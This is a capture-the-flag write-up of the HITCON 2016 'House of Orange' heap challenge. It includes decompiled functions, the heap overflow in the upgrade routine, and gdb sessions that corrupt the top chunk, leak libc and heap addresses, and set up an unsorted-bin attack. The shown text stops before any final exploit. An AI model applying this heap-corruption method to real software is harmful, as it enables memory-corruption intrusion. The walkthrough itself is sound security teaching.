---
title: "Pwn-House of Orange(500) - Solved by 3 Teams"
sidebar_position: 1
---


## **Information**

### Description
```
My teammate, Orange, need a house. Can you build it ?   
nc 52.68.192.99 56746  
  
[hourseoforange](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682)  
[libc.so.6](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/libc.so.6_375198810bb39e6593a968fcbcf6556789026743)
```
### **Files**
* [houseoforange\_22785bece84189e632567da38e4be0e0c4bb1682](/attachments/7536648/7536754.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536648/7536755.bin)

### **Source Code**

## **Write up**

### File information

```sh title="file information"
autolycos@ubuntu:~/CTF/HITCON/houseoforange$ file ./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682 
./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped

autolycos@ubuntu:~/CTF/HITCON/houseoforange$ checksec.sh --file ./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   ./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682
autolycos@ubuntu:~/CTF/HITCON/houseoforange$
```

### Binary analysis

* When you run this problem, the following menu is displayed.

```sh title="Main Menu"
autolycos@ubuntu:~/CTF/HITCON/houseoforange$ ./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682 
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice :
```

* “Build the house” receives values ​​from the user as follows.

```sh title="Build the house menu"
Your choice : 1
Length of name :10
Name :AAAAAAAAAA
Price of Orange:+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange:1
Finish
```

* "See the house" prints what the user entered.

```sh title="See the house menu"
Your choice : 2
Name of house : AAAAAAAAAA
Price of orange : 0
        __             
        \/.--,         
        //_.'           
   .-""-/""----..      
  / . . . . . . . \    
 / . . . . . . . . \   
 |. ωωωω . .ωωωω.  |   
 \ . $$. . . $$. ..|   
 \. . . . . . . . ./   
  \ . . . O . . . /    
   '-.__.__.__._-'
```

* “Upgrade the house” allows the user to modify the values ​​entered as follows:

```sh title="Upgrade the house menu"
Your choice : 3
Length of name :20
Name:BBBBBBBBBBBBBBBBBBBB
Price of Orange: +++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange: 2
Finish
```

#### **Main**

* **The function has the following functions.**
  + Print the Menu by calling the PrintMenu() function.
  + Use the UserInput() function to receive input from the user.
  + The input value is stored in the menuNumber variable, and the defined function is called using if().

```c title="Main Function"
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int menuNumber; // eax@2

  setSIGALE();
  while ( 1 )
  {
    while ( 1 )
    {
      PrintMenu();
      menuNumber = UserInput();
      if ( menuNumber != 2 )
        break;
      SeeTheHouse();
    }
    if ( menuNumber > 2 )
    {
      if ( menuNumber == 3 )
      {
        UpgradeTheHouse();
      }
      else
      {
        if ( menuNumber == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( menuNumber != 1 )
        goto LABEL_14;
      BuildTheHouse();
    }
  }
}
```

#### **BuildTheHouse() - 0x5640720E0D37**

* **The function has the following functions.**
  + Check if the value of the global variable gHouseCount is greater than 3.
    - Use the variable to ensure that the function can be used only 4 times.
  + Allocate heap space for the HOUSE structure.
  + The length of the name to be entered is received from the user.
    - If the input value is greater than 4096, 4096 is stored in the size variable.
    - Allocate a heap with a maximum size of 4096 to houseData→name.
    - The “Name” value entered by the user is saved in houseData→name.
  + The values ​​“Name”, “Price of Orange”, and “Color of Orange” are input from the user.
  + Increases the value of the global variable gHouseCount.

```c title="Build The House Function"
int BuildTheHouse()
{
  unsigned int size; // [rsp+8h] [rbp-18h]@4
  signed int colorNumber; // [rsp+Ch] [rbp-14h]@9
  HOUSE *houseData; // [rsp+10h] [rbp-10h]@4
  INFO *info; // [rsp+18h] [rbp-8h]@9

  if ( gHouseCount > 3u )
  {
    puts("Too many house");
    exit(1);
  }

  houseData = (house *)malloc(0x10uLL);
  printf("Length of name :");
  size = UserInput();

  if ( size > 4096 )
    size = 4096;

  houseData->name = (char *)malloc(size);
  if ( !houseData->name )
  {
    puts("Malloc error !!!");
    exit(1);
  }

  printf("Name :");
  NameInput(houseData->name, size);
  info = (Info *)calloc(1uLL, 8uLL);

  printf("Price of Orange:", 8LL);
  info->price = UserInput();
  colorPrint();

  printf("Color of Orange:");
  colorNumber = UserInput();
  if ( colorNumber != 56746 && (colorNumber <= 0 || colorNumber > 7) )
  {
    puts("No such color");
    exit(1);
  }

  if ( colorNumber == 56746 )
    info->color = 56746;
  else
    info->color = colorNumber + 30;

  houseData->house = info;
  gHouseDate = houseData;
  ++gHouseCount;
  return puts("Finish");
}
```

* **Here you can check the two Structs used by the program.**

```c title="Struct HOUSE"
struct HOUSE
{
  struct Info *house;
  char *name;
};
```

```c title="Struct INFO"
struct INFO
{
  int price ;
  int color ;
};
```

#### **SeeTheHouse() - 0x5640720E0EE6**

* **The function has the following functions.**
  + Check the value of "gHouseDate->house->color".
    - If it is equal to "56746", the color orange is output.
    - It is not the same as "56746", but if it falls within the range of 30 to 37, the color orange that matches that value is displayed.
    - If it is not equal to "56746" and is not within the range 30 to 37, the program will terminate.
  + When the orange shape is printed, the name and price values ​​are also printed.
  + When outputting the orange shape, a different form of orange is output using the rand() function.

```c title="SeeTheHouse Function"
int SeeTheHouse()
{
  int v0; // eax@3
  int result; // eax@3
  int v2; // eax@8

  if ( !gHouseDate )
    return puts("No such house !");
  if ( gHouseDate->house->color == 56746 )
  {
    printf("Name of house : %s\n", gHouseDate->name);
    printf("Price of orange : %d\n", gHouseDate->house->price);
    v0 = rand();
    result = printf("\x1B[01;38;5;214m%s\x1B[0m\n", gOrangeImageArr[v0 % 8]);
  }
  else
  {
    if ( gHouseDate->house->color <= 30 || gHouseDate->house->color > 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", gHouseDate->name);
    printf("Price of orange : %d\n", gHouseDate->house->price);
    v2 = rand();
    result = printf("\x1B[%dm%s\x1B[0m\n", (unsigned int)gHouseDate->house->color, gOrangeImageArr[v2 % 8]);
  }
  return result;
}
```

#### **UpgradeTheHouse() - 0x05640720E107C**

* **The function has the following functions.**
  + Checks whether the value of the global variable gUpgradeCount is greater than 2.
    - Use the variable to ensure that the function can be used only three times.
  + If there is data in the global variable gHouseDate, the value is input from the user.
  + The length of “name” is input from the user.
    - If the value is greater than 4096, set the size value to 4096.
  + Change the value stored in the “gHouseDate→name” variable using the NameInput() function.
    - There is no limit to the length of the string that can be stored in gHouseDate→name.
    - Heap Overflow occurs here.
  + Price and color values ​​are input from the user.
  + Increases the value of the gUpgradeCount variable.

```c title="Upgrade The House Function"
int UpgradeTheHouse()
{
  Info *info; // rbx@7
  unsigned int size; // [rsp+8h] [rbp-18h]@5
  signed int colorNumber; // [rsp+Ch] [rbp-14h]@7

  if ( gUpgradeCount > 2u )
    return puts("You can't upgrade more");
  if ( !gHouseDate )
    return puts("No such house !");

  printf("Length of name :");
  size = UserInput();
  if ( size > 4096 )
    size = 4096;

  printf("Name:");
  NameInput(gHouseDate->name, size);

  printf("Price of Orange: ", size);
  info = gHouseDate->house;
  info->price = UserInput();
  colorPrint();

  printf("Color of Orange: ");
  colorNumber = UserInput();

  if ( colorNumber != 56746 && (colorNumber <= 0 || colorNumber > 7) )
  {
    puts("No such color");
    exit(1);
  }

  if ( colorNumber == 56746 )
    gHouseDate->house->color = 56746;
  else
    gHouseDate->house->color = colorNumber + 30;
  ++gUpgradeCount;
  return puts("Finish");
}
```

### **Debuging**

#### **Heap Overflow**

* **To check for Heap Overflow, set Break pointf as follows.**
  + 0x555555554daa: After allocating a Heap to store the “Name” value in the BuildTheHouse() function
  + 0x555555554dfe: After calling the NameInput() function in the BuildTheHouse() function
  + 0x555555554e0d: After calling the calloc() function in the BuildTheHouse() function
  + 0x555555555119: Before calling the NameInput() function in the UpgradeTheHouse() function
  + 0x55555555511e: After calling the NameInput() function in the UpgradeTheHouse() function

```sh title="Set break point"
autolycos@ubuntu:~/CTF/HITCON/houseoforange$ gdb -q ./houseo*
Reading symbols from ./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682...(no debugging symbols found)...done.
gdb-peda$ b *0x555555554daa
Breakpoint 1 at 0x555555554daa
gdb-peda$ b *0x555555554dfe
Breakpoint 2 at 0x555555554dfe
gdb-peda$ b *0x555555554e0d
Breakpoint 3 at 0x555555554e0d
gdb-peda$ b *0x555555555119
Breakpoint 4 at 0x555555555119
gdb-peda$ b *0x55555555511e
Breakpoint 4 at 0x55555555511e
gdb-peda$
```

* **Calls the “Build the house” function.**
  + 10 was entered as the length of the Name, and the memory area allocated by malloc() is 0x555555758030.
  + Heap space to store Price and Color values ​​is allocated using the calloc() function.
    - Heap space of 0x20 bytes is allocated.

```sh title="Build the house"
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/autolycos/CTF/HITCON/houseoforange/houseoforange_22785bece84189e632567da38e4be0e0c4bb1682 
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 1
Length of name :10

Breakpoint 1, 0x0000555555554daa in ?? ()
gdb-peda$ i r rax
rax            0x555555758030	0x555555758030
gdb-peda$ x/8gx 0x555555758030
0x555555758030:	0x0000000000000000	0x0000000000000000
0x555555758040:	0x0000000000000000	0x0000000000020fc1
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
Name :AAAAAAAAA
Breakpoint 2, 0x0000555555554dfe in ?? ()
gdb-peda$ x/8gx 0x555555758030
0x555555758030:	0x4141414141414141	0x0000000000000a41
0x555555758040:	0x0000000000000000	0x0000000000020fc1
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
Breakpoint 3, 0x0000555555554e0d in ?? ()
gdb-peda$ x/8gx 0x555555758030
0x555555758030:	0x4141414141414141	0x0000000000000a41
0x555555758040:	0x0000000000000000	0x0000000000000021
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000020fa1
gdb-peda$ c
```

* **Let’s use the “Upgrade the house” function to cause a Heap Overflow.**
  + Enter 60 as the value for "Length of name".
  + Enter 50 'B' \* and 8 'C' \* as the value for "Name".
    - The entered string is stored in the 0x555555758030 to 0x55555575806C area.
    - The price and color values ​​are stored in the 0x555555758050 area.
* **The following attacks are possible using this vulnerability.**
  + It is possible to extract Libc addresses and Heap addresses using Heap Overflow.
  + An “Unsort bin attack” attack is also possible by changing the value of the top chunk.

```sh title="Upgrade the house"
gdb-peda$ c
Continuing.
Price of Orange:100
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange:1
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 3
Length of name :60
Name:

Breakpoint 4, 0x0000555555555119 in ?? ()
gdb-peda$ x/8gx 0x555555758030
0x555555758030:	0x4141414141414141	0x0000000000000a41
0x555555758040:	0x0000000000000000	0x0000000000000021
0x555555758050:	0x0000001f00000064	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000020fa1
gdb-peda$ ni
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCC
Breakpoint 5, 0x000055555555511e in ?? ()
gdb-peda$ x/8gx 0x555555758030
0x555555758030:	0x4242424242424242	0x4242424242424242
0x555555758040:	0x4242424242424242	0x4242424242424242
0x555555758050:	0x4242424242424242	0x4242424242424242
0x555555758060:	0x4343434343424242	0x000000000a434343
gdb-peda$
```

### Structure of Exploit code

* The order of payload is as follows:

:::note Payload Flow
1. Libc, Heap addresss Leak
2. Unsorted bin attack
::: 

* This is explained in more detail as follows.

:::note[Detailed description]
1. Libc, Heap addresss Leak
   1. Create large chunk using heap overflow
2. Unsorted bin attack
:::
* The information you need to find out for an attack based on the payload is as follows.

:::note[List of information to check]
1. Leaklibcaddresss
:::

### **Information for attack**

#### **Leak - Overwrite of top chunk**

* **Top chunk can be modified using the heap overflow that occurs in the “Upgrade the house” function.**
  + Reduce the size of the top chunk to allocate a new memory area.
  + malloc() uses sysmalloc() to allocate a new memory area if the Top chunk size is not enough.
* **sysmalloc() checks the value of Top chunk to allocate a new area.**
  + In order to be allocated a new memory area through top chunk modulation, the following conditions must be met.
    1. Must be greater than MINSIZE (0x10). (unsigned long) (old\_size) >= MINSIZE
    2. Must be smaller than need size + MINSIZE. (unsigned long) (old\_size) &lt; (unsigned long) (nb + MINSIZE))
    3. prev\_inuse must be set. prev\_inuse (old\_top)
    4. old\_top +oldsize The pages need to be sorted.

```c title = "malloc.c -> sysmalloc() [ ver. glibc 2.23 ]"
 /*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */

  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

* **Set the break point as follows.**
  + 0x555555554daa: After allocating a Heap to store the “Name” value in the BuildTheHouse() function
  + 0x555555554dfe: After calling the NameInput() function in the BuildTheHouse() function
  + 0x555555554e0d: After calling the calloc() function in the BuildTheHouse() function
  + 0x55555555511e: After calling the NameInput() function in the UpgradeTheHouse() function

```sh title="Set break point"
gdb-peda$ b *0x555555554000 + 0xDAA
Breakpoint 1 at 0x555555554daa
gdb-peda$ b *0x555555554000 + 0xDFE
Breakpoint 2 at 0x555555554dfe
gdb-peda$ b *0x555555554000 + 0xE0D
Breakpoint 3 at 0x555555554e0d
gdb-peda$ b *0x555555554000 + 0x111E
Breakpoint 4 at 0x55555555511e
gdb-peda$
```

* **Allocate heap area using the “BuildTheHouse” function.**  
  + The size of the heap to be allocated is 16.

```sh title="Create heap"
gdb-peda$ r
Starting program: /home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange 
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 1
Length of name :16
Breakpoint 1, 0x0000555555554daa in ?? ()
gdb-peda$ i r rax
rax            0x555555758030	0x555555758030
gdb-peda$ x/16gx 0x555555758030
0x555555758030:	0x0000000000000000	0x0000000000000000
0x555555758040:	0x0000000000000000	0x0000000000020fc1
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
Name :AAAAAAAAAAAABB
Breakpoint 2, 0x0000555555554dfe in ?? ()
gdb-peda$ x/16gx 0x555555758030
0x555555758030:	0x4141414141414141	0x000a424241414141
0x555555758040:	0x0000000000000000	0x0000000000020fc1
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
Breakpoint 3, 0x0000555555554e0d in ?? ()
gdb-peda$ x/16gx 0x555555758030
0x555555758030:	0x4141414141414141	0x000a424241414141
0x555555758040:	0x0000000000000000	0x0000000000000021
0x555555758050:	0x0000000000000000	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000020fa1
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **You can change the top chunk using the “UpgradeTheHouse” function.**
  + Change the value of Top chunk to 0xfa1 (3889).  
    - The value of Top chunk before change is 0x20fa1.
  + If you request allocation of a heap larger than that size due to the changed size of the top chunk, malloc uses sysmalloc() to allocate a new memory area.  
    - As a result, the existing top chunk area is added to the unsorted bin as a free chunk.
    - Free chunk fd and bk area values ​​are also created.

```sh title="Overwrite for Top chunk"
gdb-peda$ c
Continuing.
Price of Orange:100
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange:1
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 3
Length of name :70
Name:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB

Breakpoint 4, 0x000055555555511e in ?? ()
gdb-peda$ x/16gx 0x555555758030
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141
0x555555758050:	0x4141414141414141	0x4141414141414141
0x555555758060:	0x4141414141414141	0x0a42424241414141
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000000
gdb-peda$ set *0x555555758068 = 0xfa1
gdb-peda$ set *0x55555575806c = 0x0
gdb-peda$ x/16gx 0x555555758030
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141
0x555555758050:	0x4141414141414141	0x4141414141414141
0x555555758060:	0x4141414141414141	0x0000000000000fa1
0x555555758070:	0x0000000000000000	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000000
0x555555758090:	0x0000000000000000	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **Use the "BuildTheHouse" function to allocate a heap larger than the top chunk.**  
  + Request allocation of a heap of size 4096, which is larger than the size of the top chunk.
  + The heap area newly allocated by sysmalloc() is 0x55f72a511010.
  + As explained earlier, the top chunk became a free chunk, and the values ​​of fd (forward pointer) and bk (backward pointer) were also created.
    - An attacker can exploit data stored in the fd and bk areas.  
      * The value stored in the fd,bk address (0x7f68e8d2c7b8) is 0x55f72a512010.
      * 0x55f72a512010 = Starting address of the allocated heap (0x55f72a511010) + heap size (0x1000, 4096)

```sh title="Create unsorted bin"
gdb-peda$ c
Continuing.
Price of Orange: 200
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange: 2
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 1
Length of name :4096
Breakpoint 1, 0x0000555555554daa in ?? ()
gdb-peda$ i r rax
rax            0x555555779010	0x555555779010
gdb-peda$ x/16gx 0x555555758030
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141
0x555555758050:	0x00000020000000c8	0x4141414141414141
0x555555758060:	0x4141414141414141	0x0000000000000021
0x555555758070:	0x000000000000000a	0x0000000000000000
0x555555758080:	0x0000000000000000	0x0000000000000f61
0x555555758090:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x5555557580a0:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

#### **Leak - Libc addresss**

* **You can extract Libc addresses using the "BuildTheHouse" function.**
  + Enter 1024 as the size of the newly allocated heap.
  + As a result, the corresponding area (0x5555557580d0) is allocated within the existing heap area.
    - This is not an additional heap area created by sysmalloc().
  + The address of the main\_arena area is stored in the “0x5555557580d0” and “0x5555557580d8” areas.
  + If you enter 8 characters as the input value for "Name", the corresponding address value can be output.

```sh title="Write 8 characters in the Heap"
gdb-peda$ c
Continuing.
Name :HEAP

Breakpoint 2, 0x0000555555554dfe in ?? ()
gdb-peda$ c
Continuing.

Breakpoint 3, 0x0000555555554e0d in ?? ()
gdb-peda$ c
Continuing.
Price of Orange:300
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange:3
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 1
Length of name :1024
Breakpoint 1, 0x0000555555554daa in ?? ()
gdb-peda$ i r rax
rax            0x5555557580d0	0x5555557580d0

gdb-peda$ x/10gx 0x5555557580d0
0x5555557580d0:	0x00007ffff7dd2188	0x00007ffff7dd2188
0x5555557580e0:	0x00005555557580c0	0x00005555557580c0
0x5555557580f0:	0x0000000000000000	0x0000000000000000
0x555555758100:	0x0000000000000000	0x0000000000000000
0x555555758110:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/gx 0x00007ffff7dd2188
0x7ffff7dd2188 <main_arena+1640>:	0x00007ffff7dd2178
gdb-peda$
```

* **Enter 8 characters as “Name”**
  + In the example below, we entered "LEAKADD".
    - “0x0a4444414b41454c” is stored in memory.
  + "0x5555557580d8" The area value and the entered string are recognized as one sentence.
* **You can output the value in the “0x5555557580d8” area through the “See the house” function.**
  + Leak data : ?!???

```sh title="Leak libc address"
gdb-peda$ c
Continuing.
Name :LEAKADD

Breakpoint 2, 0x0000555555554dfe in ?? ()
gdb-peda$ x/10gx 0x5555557580d0
0x5555557580d0:	0x0a4444414b41454c	0x00007ffff7dd2188
0x5555557580e0:	0x00005555557580c0	0x00005555557580c0
0x5555557580f0:	0x0000000000000000	0x0000000000000000
0x555555758100:	0x0000000000000000	0x0000000000000000
0x555555758110:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing
Breakpoint 3, 0x0000555555554e0d in ?? ()
gdb-peda$ c
Continuing.
Price of Orange:400
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange:4
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 2
Name of house : LEAKADD
?!???
Price of orange : 400
        __            
        \/.--,        
        //_.'         
   .-""-/""----..     
  / . . . . . . . \   
 / . . \ . . / . . \  
 |. ____\ . /____. |  
 \ . . . . . . . . |  
 \. . . . . . . . ./  
  \ . . . ～ . . ./   
   '-.__.__.__._-'    

+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice :
```

#### **Leak - Heap addresss**

* **Heap addresses can be leaked using the "Upgrade the house" function as follows.**
  + The heap address exists 16 bytes away from "0x5555557580d0".
  + To leak it, enter the character 15 as the value for "Name".
* **You can output heap addresses through the “See the house” function.**
  + Leak data : ??uUUU

```sh title="Leak for Heap address"
Name of house : LEAKADD
?!???
Price of orange : 400
        __            
        \/.--,        
        //_.'         
   .-""-/""----..     
  / . . . . . . . \   
 / . . \ . . / . . \  
 |. ____\ . /____. |  
 \ . . . . . . . . |  
 \. . . . . . . . ./  
  \ . . . ～ . . ./   
   '-.__.__.__._-'    

+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 3
Length of name :1024
Name:BBBBBBBBBBBBBBB

Breakpoint 4, 0x000055555555511e in ?? ()
gdb-peda$ x/10gx 0x5555557580d0
0x5555557580d0:	0x4242424242424242	0x0a42424242424242
0x5555557580e0:	0x00005555557580c0	0x00005555557580c0
0x5555557580f0:	0x0000000000000000	0x0000000000000000
0x555555758100:	0x0000000000000000	0x0000000000000000
0x555555758110:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
Price of Orange: 500
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange: 5
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 2
Name of house : BBBBBBBBBBBBBBB
??uUUU
Price of orange : 500
        __             
        \/.--,         
        //_.'           
   .-""-/""----..      
  / . . . . . . . \    
 / . . . . . . . . \   
 |. ωωωω . .ωωωω.  |   
 \ . $$. . . $$. ..|   
 \. . . . . . . . ./   
  \ . . . O . . . /    
   '-.__.__.__._-'     

+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice :
```

### **HouseOfOrange**

* **HouseOfOrange attack is possible using Unsorted bin attack in the following way.**
  + For analysis, set a break point in the “0x555555555119” area.
  + Pass “2048” as the input value for “Length of name”.
* **The important part is the area currently stored in the Unsorted bin of main\_arena.**
  + The area saved in the unsorted bin area is 0x5555557584f0.
  + That is, the area to be overwritten is 0x5555557584f0.
  + The value entered by the NamaInput() function is stored starting from the "0x5555557580d0" area.
    - To overwrite the 0x5555557584f0 area, 1056 random characters must be entered.
    - Ex) "A" \* 1056 + "B" \* 32
  + The value of the Unsorted chunk area has been changed according to the input value as shown below.

```sh title="Check Unsorted bin"
Your choice : 2
Name of house : BBBBBBBBBBBBBBB
??uUUU
Price of orange : 500
        __             
        \/.--,         
        //_.'          
   .---//------..      
  / . . . . . . . \    
 / . ./\. . ./\ .. \   
 |. ./  \. ./  \ . |  
 \ . . . . . . . ..|  
 \. . . . . . . . ./   
  \ . . \___/. . ./    
   '-.__.__.__._-'     

+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : ^C
Program received signal SIGINT, Interrupt.
gdb-peda$ b *0x555555554000 + 0x1119
Breakpoint 5 at 0x555555555119
gdb-peda$ c
3
Length of name :2048
Name:
Breakpoint 5, 0x0000555555555119 in ?? ()
gdb-peda$ i r rdi
rdi            0x5555557580d0	0x5555557580d0
gdb-peda$ p main_arena.bins[0]
$8 = (mchunkptr) 0x5555557584f0
gdb-peda$ p main_arena.bins[1]
$9 = (mchunkptr) 0x5555557584f0
gdb-peda$ p/d 0x5555557584f0 - 0x5555557580d0
$10 = 1056
gdb-peda$ x/8gx 0x5555557580d0 + 1040
0x5555557584e0:	0x00000023000001f4	0x0000000000000000
0x5555557584f0:	0x0000000000000000	0x0000000000000af1
0x555555758500:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555758510:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
